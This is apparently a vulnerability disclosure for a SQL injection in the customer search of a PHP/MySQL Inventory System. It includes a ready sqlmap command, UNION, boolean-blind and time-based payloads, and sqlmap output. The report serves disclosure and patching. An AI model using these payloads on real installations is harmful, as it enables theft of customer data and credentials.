# SQL Injection in Inventory System (View Customers)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Customers View (`view_customers.php`)
* **Vulnerable Parameter**: `searchtxt` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `view_customers.php` file.

The application fails to properly sanitize the `searchtxt` parameter in the HTTP POST request (triggered by the search functionality on the customers list page). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries**, attackers can directly retrieve and display sensitive data from the database on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Navigate**: Go to the Customers List page (`/view_customers.php`).
4. **Exploit**: Use the search bar to submit malicious SQL payloads, or capture the request and use a tool like `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/view_customers.php" \
--data "searchtxt=test&Search=Search" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
searchtxt=test' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a787671,0x7044525250596b6f514258686f596c766c43524b7a416958474b4751495a6e597254534e674a6f65,0x71787a7071),NULL,NULL#&Search=Search

```

**Boolean-based Blind Payload:**

```sql
searchtxt=-4646' OR 2396=2396#&Search=Search

```

**Time-based Blind Payload:**

```sql
searchtxt=test' AND (SELECT 8866 FROM (SELECT(SLEEP(5)))qsSU)-- YCnJ&Search=Search

```

## Proof of Concept

The following output from `sqlmap` confirms that the `searchtxt` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: searchtxt (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchtxt=-4646' OR 2396=2396#&Search=Search
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtxt=test' AND (SELECT 8866 FROM (SELECT(SLEEP(5)))qsSU)-- YCnJ&Search=Search
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: searchtxt=test' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a787671,0x7044525250596b6f514258686f596c766c43524b7a416958474b4751495a6e597254534e674a6f65,0x71787a7071),NULL,NULL#&Search=Search
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL#
---
[INFO] the back-end DBMS is MySQL

```

<img width="1050" height="386" alt="图片" src="https://github.com/user-attachments/assets/65120b66-558c-4a1e-bfb0-5956c5a12f27" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display the entire database content (customer PII, credentials, sales data) via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
